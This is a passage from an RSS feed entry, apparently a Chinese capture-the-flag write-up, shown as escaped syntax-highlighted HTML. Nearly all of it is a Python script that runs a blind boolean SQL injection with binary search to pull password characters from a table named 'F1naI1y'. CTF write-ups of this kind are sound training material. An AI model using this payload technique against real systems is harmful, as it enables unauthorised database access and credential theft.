&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload[&lt;span style="color:#e6db74">&amp;#34;id&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;0^&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(ascii(substr((select(group_concat(password))from(F1naI1y)),&lt;/span>&lt;span style="color:#e6db74">{0}&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">{1}&lt;/span>&lt;span style="color:#e6db74">)&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(i,mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> html &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(url,params&lt;span style="color:#f92672">=&lt;/span>payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(html&lt;span style="color:#f92672">.&lt;/span>code&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.2&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;错误,以延迟0.2秒&amp;#39;&lt;/span>,html&lt;span style="color:#f92672">.&lt;/span>code)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 正常的回显内容&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;others&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> html&lt;span style="color:#f92672">.&lt;/span>text:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l &lt;span style="color:#f92672">=&lt;/span> mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> mid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mid &lt;span style="color:#f92672">=&lt;/span> (l&lt;span style="color:#f92672">+&lt;/span>r)&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(chr(mid)&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> result &lt;span style="color:#f92672">+&lt;/span> chr(mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#出现连续的感叹号,就停&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(mid&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(g&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;tables: &amp;#34;&lt;/span> ,result)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有一道题的java后端代码&lt;/p></description></item></channel></rss>